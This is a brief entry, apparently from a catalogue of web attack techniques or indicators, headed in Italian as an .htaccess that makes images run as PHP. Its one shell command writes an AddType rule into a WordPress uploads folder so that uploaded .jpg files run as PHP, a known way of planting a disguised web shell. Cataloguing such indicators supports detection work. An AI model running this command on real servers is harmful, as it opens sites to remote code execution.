# category: web
# title: .htaccess che fa eseguire le immagini come PHP
# indicator: uploads/.htaccess
echo 'AddType application/x-httpd-php .jpg' >/var/www/wp/wp-content/uploads/.htaccess
